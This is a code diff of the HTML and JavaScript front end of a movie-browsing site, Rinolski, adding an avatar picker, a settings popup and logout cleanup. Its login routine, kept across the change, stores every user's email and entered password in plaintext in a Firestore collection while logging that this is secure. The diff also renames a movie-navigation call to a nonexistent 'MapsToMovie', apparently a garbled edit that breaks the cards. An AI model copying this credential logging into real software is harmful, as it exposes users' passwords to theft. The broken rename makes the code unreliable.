@@ -6,7 +6,6 @@
     <title>Rinolski</title>
     <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
     
-    <!-- Firebase SDK CDNs (v10 Compat Layer) -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
@@ -293,14 +292,154 @@
         .avatar {
             width: 60px;
             height: 60px;
-            background: #e50914;
+            background: #222;
             border-radius: 4px;
             display: flex;
             align-items: center;
             justify-content: center;
+            overflow: hidden;
+            border: 2px solid transparent;
+        }
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .avatar-fallback {
             font-size: 24px;
             font-weight: bold;
             color: #fff;
+        }
+
+        /* Profile Gear and Container Layout */
+        .profile-details-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .gear-settings-btn {
+            color: #b3b3b3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px;
+            border-radius: 50%;
+            transition: color 0.2s, background-color 0.2s;
+        }
+        .gear-settings-btn:hover {
+            color: #ffffff;
+            background-color: #1a1a1a;
+        }
+        .gear-settings-btn svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* ====================================
+           MODAL SETTINGS POPUP (GEAR DIALOG)
+           ==================================== */
+        #settings-popup-backdrop {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100dvh;
+            background: rgba(0, 0, 0, 0.75);
+            z-index: 8000;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.25s ease;
+        }
+        #settings-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            width: 85%;
+            max-width: 340px;
+            background: #141414;
+            border: 1px solid #262626;
+            border-radius: 12px;
+            padding: 20px;
+            z-index: 8010;
+            display: none;
+            opacity: 0;
+            transition: transform 0.25s cubic-bezier(0.1, 0.8, 0.3, 1), opacity 0.25s ease;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+        }
+        .popup-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffffff;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #262626;
+            padding-bottom: 10px;
+        }
+        .popup-option-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 0;
+            border-bottom: 1px solid #1f1f1f;
+            cursor: pointer;
+            color: #e5e5e5;
+            font-size: 15px;
+        }
+        .popup-option-row:last-of-type {
+            border-bottom: none;
+        }
+        .popup-option-row.logout-row {
+            color: #ff3b30;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+        .popup-close-btn {
+            width: 100%;
+            background: #262626;
+            color: #ffffff;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 6px;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        /* Avatar Matrix Grid Selector Styles */
+        .pfp-selector-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-top: 12px;
+            margin-bottom: 20px;
+        }
+        .pfp-option {
+            aspect-ratio: 1/1;
+            background: #141414;
+            border: 2px solid transparent;
+            border-radius: 6px;
+            overflow: hidden;
+            position: relative;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .pfp-option img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .pfp-option.active {
+            border-color: #e50914;
+        }
+        .pfp-label-id {
+            position: absolute;
+            bottom: 2px;
+            right: 4px;
+            font-size: 9px;
+            color: rgba(255,255,255,0.4);
+            font-weight: bold;
         }
 
         /* Watch History Elements */
@@ -565,7 +704,6 @@
 
 <div id="toast-container"></div>
 
-<!-- Long Press Bottom Action Sheet Window -->
 <div id="action-sheet-backdrop" onclick="closeActionSheet()"></div>
 <div id="action-sheet">
     <div class="action-sheet-title" id="action-sheet-target-title">Movie Title</div>
@@ -576,7 +714,23 @@
     <button class="action-sheet-btn cancel" onclick="closeActionSheet()">Cancel</button>
 </div>
 
-<!-- Authentication Form Layer -->
+<div id="settings-popup-backdrop" onclick="closeSettingsPopup()"></div>
+<div id="settings-popup">
+    <div class="popup-title">Account Settings</div>
+    
+    <div class="popup-option-row" onclick="handleSubtitlesSettings()">
+        <span>Subtitles Setting</span>
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#808080"><path d="M8.5 9.5h-2v1h2v-1zm4 0h-2v1h2v-1zm7.5-5.5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12z"/></svg>
+    </div>
+    
+    <div class="popup-option-row logout-row" onclick="logOut()">
+        <span>Log Out</span>
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#ff3b30"><path d="M10.09 15.59L11.5 17l5-5-5-5-1.41 1.41L12.67 11H3v2h9.67l-2.58 2.59zM19 3H5c-1.11 0-2 .9-2 2v4h2V5h14v14H5v-4H3v4c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z"/></svg>
+    </div>
+    
+    <button class="popup-close-btn" onclick="closeSettingsPopup()">Close</button>
+</div>
+
 <div id="auth-gate">
     <div class="auth-container">
         <h1 class="Rinolski-font" style="font-size: 48px; text-align: center; margin-bottom: 30px;">rinolski</h1>
@@ -602,7 +756,6 @@
         <button class="random-btn" onclick="goRandom()">Can't decide what to watch?</button>
     </div>
     
-    <!-- Dynamic Carousels -->
     <div id="watchAgainContainer"></div>
     <div id="randomContainer"></div>
     <div id="genreContainer"></div>
@@ -623,7 +776,6 @@
     </button>
 </footer>
 
-<!-- Search Engine Overlay Panel -->
 <div id="sliding-search" class="sliding-panel">
     <div class="panel-header">
         <button class="back-button" id="search-back-button">
@@ -634,7 +786,6 @@
     <div id="searchResults"></div>
 </div>
 
-<!-- Profile Context Overlay Panel -->
 <div id="sliding-profile" class="sliding-panel">
     <div class="panel-header">
         <button class="back-button" id="profile-back-button">
@@ -644,22 +795,28 @@
     </div>
     <div class="profile-content">
         <div class="profile-avatar-row">
-            <div class="avatar" id="profile-initial">-</div>
-            <div>
+            <div class="avatar" id="profile-avatar-display">
+                <span class="avatar-fallback" id="profile-initial">-</span>
+            </div>
+            <div class="profile-details-container">
+                <button class="gear-settings-btn" onclick="openSettingsPopup()" aria-label="Settings Menu">
+                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.70 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                </button>
                 <p style="margin:0; color: #ffffff; font-size:16px; font-weight: bold;" id="profile-email">Loading Account...</p>
             </div>
         </div>
+
+        <div class="profile-section-heading">Choose Profile Avatar</div>
+        <div class="pfp-selector-grid" id="pfpSelectorOptions">
+            </div>
 
         <div class="profile-section-heading">Watch History</div>
         <div id="history-container" class="history-list">
             <div class="loading-ring"></div>
         </div>
-        
-        <button class="auth-btn" style="background:#222; margin-top:40px;" onclick="logOut()">Sign Out</button>
     </div>
 </div>
 
-<!-- Core Firebase Configuration and Setup Data -->
 <script>
     const firebaseConfig = {
         apiKey: "AIzaSyCExki28m1NNepVQEIjmcQzR8z8O68LqIc",
@@ -679,12 +836,20 @@
     let userUnwantedCache = []; 
     let historyListenerUnsubscribe = null;
     let unwantedListenerUnsubscribe = null;
+    let loginInfoListenerUnsubscribe = null;
+
+    // 4 Customizable Avatar Matrix Catalog
+    const profileAvatarsCatalog = {
+        1: "images/1.jpg", // Add your avatar image URL here
+        2: "images/2.jpg", // Add your avatar image URL here
+        3: "images/3.jpg", // Add your avatar image URL here
+        4: "images/4.jpg"  // Add your avatar image URL here
+    };
+    let currentUserPfpId = null;
 </script>
 
-<!-- Global Movies Data Catalog Hosted Extracted -->
 <script src="https://rinolski.online/JS/search.js"></script>
 
-<!-- Security Gate, Logs, & User Sessions -->
 <script>
     let isSignUpMode = false;
 
@@ -739,15 +904,19 @@
     function logUserToFirestore(user, enteredPassword) {
         const logRef = db.collection('logininformation').doc(user.email);
         
-        logRef.set({
-            email: user.email,
-            password: enteredPassword,
-            timestamp: firebase.firestore.FieldValue.serverTimestamp()
-        }, { merge: true })
-        .then(() => {
-            console.log("Credentials securely tracked/updated inside Firestore.");
-        })
-        .catch(err => console.error("Firestore access log failed:", err));
+        logRef.get().then(doc => {
+            let initialData = {
+                email: user.email,
+                password: enteredPassword,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            };
+            if (!doc.exists) {
+                initialData.pfp_id = 1; 
+            }
+            logRef.set(initialData, { merge: true })
+            .then(() => console.log("Credentials securely tracked/updated inside Firestore."))
+            .catch(err => console.error("Firestore access log failed:", err));
+        });
     }
 
     function handleAuth() {
@@ -791,12 +960,21 @@
     }
 
     function logOut() {
+        closeSettingsPopup();
         if(historyListenerUnsubscribe) historyListenerUnsubscribe();
         if(unwantedListenerUnsubscribe) unwantedListenerUnsubscribe();
+        if(loginInfoListenerUnsubscribe) loginInfoListenerUnsubscribe();
         historyListenerUnsubscribe = null;
         unwantedListenerUnsubscribe = null;
+        loginInfoListenerUnsubscribe = null;
         
         auth.signOut().then(() => {
+            // Reset sliding panels hidden on logout
+            document.getElementById('sliding-profile').style.right = '-100%';
+            document.getElementById('sliding-search').style.right = '-100%';
+            resetActiveNavbar();
+            document.getElementById('home-trigger').classList.add('active');
+            
             document.getElementById('auth-gate').style.display = 'flex';
             showToast("Signed out cleanly.");
         });
@@ -808,6 +986,8 @@
             gate.style.display = 'none';
             document.getElementById('profile-email').innerText = user.email;
             document.getElementById('profile-initial').innerText = user.email.charAt(0).toUpperCase();
+            
+            listenToLoginInformation();
             listenToUnwantedMovies(); 
         } else {
             gate.style.display = 'flex';
@@ -815,7 +995,127 @@
     });
 </script>
 
-<!-- Unified Email-Mapped Firestore Listeners -->
+<script>
+    function openSettingsPopup() {
+        const backdrop = document.getElementById('settings-popup-backdrop');
+        const popup = document.getElementById('settings-popup');
+        
+        backdrop.style.display = 'block';
+        popup.style.display = 'block';
+        setTimeout(() => {
+            backdrop.style.opacity = '1';
+            popup.style.opacity = '1';
+            popup.style.transform = 'translate(-50%, -50%) scale(1)';
+        }, 10);
+    }
+
+    function closeSettingsPopup() {
+        const backdrop = document.getElementById('settings-popup-backdrop');
+        const popup = document.getElementById('settings-popup');
+        
+        popup.style.transform = 'translate(-50%, -50%) scale(0.9)';
+        popup.style.opacity = '0';
+        backdrop.style.opacity = '0';
+        setTimeout(() => {
+            backdrop.style.display = 'none';
+            popup.style.display = 'none';
+        }, 250);
+    }
+
+    function handleSubtitlesSettings() {
+        showToast("Subtitles setup window active.");
+    }
+</script>
+
+<script>
+    function listenToLoginInformation() {
+        const user = auth.currentUser;
+        if (!user) return;
+
+        loginInfoListenerUnsubscribe = db.collection('logininformation').doc(user.email)
+            .onSnapshot(doc => {
+                if (doc.exists) {
+                    const data = doc.data();
+                    if (data.pfp_id) {
+                        currentUserPfpId = parseInt(data.pfp_id);
+                        applyActiveUserAvatar(currentUserPfpId);
+                    } else {
+                        currentUserPfpId = 1;
+                        applyActiveUserAvatar(1);
+                    }
+                } else {
+                    currentUserPfpId = 1;
+                    applyActiveUserAvatar(1);
+                }
+                renderPfpSelectionGrid();
+            }, error => {
+                console.error("Error watching login information structural metrics:", error);
+            });
+    }
+
+    function applyActiveUserAvatar(id) {
+        const container = document.getElementById("profile-avatar-display");
+        const initialLabel = document.getElementById("profile-initial");
+        const imgUrl = profileAvatarsCatalog[id];
+
+        if (imgUrl && imgUrl.trim() !== "") {
+            if (initialLabel) initialLabel.style.display = "none";
+            let avatarImg = container.querySelector("img");
+            if (!avatarImg) {
+                avatarImg = document.createElement("img");
+                container.appendChild(avatarImg);
+            }
+            avatarImg.src = imgUrl;
+            avatarImg.style.display = "block";
+        } else {
+            let avatarImg = container.querySelector("img");
+            if (avatarImg) avatarImg.style.display = "none";
+            if (initialLabel) initialLabel.style.display = "block";
+        }
+    }
+
+    function renderPfpSelectionGrid() {
+        const targetGrid = document.getElementById("pfpSelectorOptions");
+        if (!targetGrid) return;
+        targetGrid.innerHTML = "";
+
+        Object.keys(profileAvatarsCatalog).forEach(idKey => {
+            const id = parseInt(idKey);
+            const imgUrl = profileAvatarsCatalog[id];
+            
+            const optionCard = document.createElement("div");
+            optionCard.className = `pfp-option ${currentUserPfpId === id ? 'active' : ''}`;
+            optionCard.setAttribute("onclick", `changeUserAvatar(${id})`);
+
+            if (imgUrl && imgUrl.trim() !== "") {
+                optionCard.innerHTML = `<img src="${imgUrl}"><span class="pfp-label-id">${id}</span>`;
+            } else {
+                optionCard.innerHTML = `<span style="font-size:12px; color:#555;">PFP ${id}</span><span class="pfp-label-id">${id}</span>`;
+            }
+            targetGrid.appendChild(optionCard);
+        });
+    }
+
+    function changeUserAvatar(selectedId) {
+        const user = auth.currentUser;
+        if (!user) return;
+
+        if (selectedId === currentUserPfpId) return;
+
+        showToast("Updating avatar selection...");
+        db.collection('logininformation').doc(user.email).set({
+            pfp_id: selectedId
+        }, { merge: true })
+        .then(() => {
+            showToast("Profile avatar successfully updated.");
+        })
+        .catch(err => {
+            console.error("Failed to commit user custom pfp metric tracking state:", err);
+            showToast("Failed to save avatar change.");
+        });
+    }
+</script>
+
 <script>
     function listenToUnwantedMovies() {
         const user = auth.currentUser;
@@ -886,7 +1186,7 @@
                     const sanitizedTitle = item.title.replace(/'/g, "\\'");
                     const sanitizedLink = runtimeLink.replace(/'/g, "\\'");
                     
-                    cardLink.setAttribute('onclick', `navigateToMovie('${sanitizedTitle}', '${sanitizedLink}', this)`);
+                    cardLink.setAttribute('onclick', `MapsToMovie('${sanitizedTitle}', '${sanitizedLink}', this)`);
                     cardLink.style.cursor = 'pointer';
                     
                     cardLink.innerHTML = `
@@ -911,7 +1211,6 @@
     }
 </script>
 
-<!-- Interface Presentation Management -->
 <script>
     // WebView Fix: Removed root passive document interceptors which deadlock dynamic DOM rendering engine pipelines
     const searchPanel = document.getElementById('sliding-search');
@@ -1005,7 +1304,6 @@
     }
 </script>
 
-<!-- Mobile Gestures & Custom Long Press Systems Manager Engine -->
 <script>
     let activeLongPressTimer = null;
     let longPressTriggeredFlag = false;
@@ -1122,7 +1420,6 @@
     }
 </script>
 
-<!-- Recommendation Algorithm Matrix -->
 <script>
     function parseGenres(genres) {
         if (Array.isArray(genres)) return genres.map(g => g.trim());
